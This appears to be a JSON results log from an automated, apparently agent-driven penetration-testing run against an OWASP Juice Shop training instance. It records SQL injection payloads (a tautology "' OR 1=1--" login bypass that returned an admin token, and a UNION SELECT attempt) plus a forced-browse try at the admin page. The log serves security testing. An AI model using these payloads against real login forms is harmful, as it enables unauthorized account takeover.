@@ -1,0 +1,129 @@
+{
+  "run_id": "r1779570366",
+  "target_url": "https://juice-shop-production-d0c5.up.railway.app",
+  "started_at": "2026-05-23T21:06:06Z",
+  "finished_at": "2026-05-23T21:07:35Z",
+  "duration_s": 89.603060218,
+  "generations_run": 1,
+  "total_pods": 3,
+  "outcome": "BREACH",
+  "best_fitness": 1,
+  "breach": {
+    "pod_id": "r1779570366-g1-p0",
+    "generation": 1,
+    "vector": "sqli_login",
+    "category": "injection",
+    "evidence": "admin token returned via SQL bypass",
+    "raw_findings": [
+      {
+        "method": "POST",
+        "snippet": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
+        "status_code": 200,
+        "url": "https://juice-shop-production-d0c5.up.railway.app/rest/user/login"
+      }
+    ]
+  },
+  "per_generation": [
+    {
+      "generation": 1,
+      "population": 3,
+      "survivors": 1,
+      "best_fitness": 1,
+      "breaches": 1,
+      "per_pod": [
+        {
+          "Genome": {
+            "vector": "sqli_login",
+            "category": "injection",
+            "technique": "tautology",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' OR 1=1--",
+              "password": "x"
+            },
+            "hint": "Try classic auth bypass via SQL tautology in email field."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "juice-shop-sqli-001",
+            "pod_id": "pod-77b2-4e91",
+            "generation": 1,
+            "vector": "sqli_login",
+            "category": "injection",
+            "status": "BREACH",
+            "fitness": 1,
+            "evidence": "admin token returned via SQL bypass",
+            "raw_findings": [
+              {
+                "method": "POST",
+                "snippet": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
+                "status_code": 200,
+                "url": "https://juice-shop-production-d0c5.up.railway.app/rest/user/login"
+              }
+            ],
+            "duration_ms": 2500,
+            "t": 1779570400000
+          },
+          "Fitness": 1,
+          "PodID": "r1779570366-g1-p0"
+        },
+        {
+          "Genome": {
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "technique": "union_select",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' UNION SELECT 1,2,3,4,5--"
+            },
+            "hint": "Try UNION-based info leak."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779570366",
+            "pod_id": "r1779570366-g1-p1",
+            "generation": 1,
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi finished without emitting a result line",
+            "raw_findings": [],
+            "duration_ms": 52000,
+            "t": 1779570418604
+          },
+          "Fitness": 0,
+          "PodID": "r1779570366-g1-p1"
+        },
+        {
+          "Genome": {
+            "vector": "admin_section",
+            "category": "access_control",
+            "technique": "force_browse",
+            "target_path": "/#/administration",
+            "params": {},
+            "hint": "Try to reach admin UI directly.",
+            "requires_nimble": true
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779570366",
+            "pod_id": "r1779570366-g1-p2",
+            "generation": 1,
+            "vector": "admin_section",
+            "category": "access_control",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi timed out after 60s",
+            "raw_findings": [],
+            "duration_ms": 62000,
+            "t": 1779570430762
+          },
+          "Fitness": 0,
+          "PodID": "r1779570366-g1-p2"
+        }
+      ]
+    }
+  ],
+  "narrative_md_path": "out/summary-r1779570366.md"
+}
